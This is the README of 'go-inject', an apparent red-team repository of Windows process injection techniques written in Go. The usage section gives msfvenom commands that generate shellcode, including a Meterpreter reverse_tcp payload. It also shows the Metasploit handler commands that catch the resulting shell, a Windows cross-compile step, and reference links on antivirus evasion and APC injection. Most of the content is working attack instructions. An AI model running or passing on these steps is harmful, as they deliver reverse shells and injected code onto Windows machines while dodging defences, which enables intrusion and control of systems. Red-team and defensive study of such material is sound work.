# go-inject

Process injection techniques written in Go.

## Usage

Use msfvenom to generate shellcode.

```bash
# Testing with calculator.
msfvenom -p windows/x64/exec CMD=calc.exe -f hex

# MSFVENOM
msfvenom -p windows/x64/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
```

Place as payload string within one of the example .go files.

Start meterpreter listener:

```bash
use payload/windows/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
# For QPC injection also use: set autorunscript post/windows/manage/migrate
to_handler
```

## Build

```bash
env GOOS=windows GOARCH=amd64 go build
```

## References

* https://medium.com/@justen.walker/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724
* https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/
* https://github.com/brimstone/go-shellcode
* https://github.com/sysdream/hershell
* https://github.com/yoda66/MalwareDevTalk
* https://posts.specterops.io/adventures-in-dynamic-evasion-1fe0bac57aa
* https://github.com/Adepts-Of-0xCC/VBA-macro-experiments/blob/main/EDRHookDetector.vba
* https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection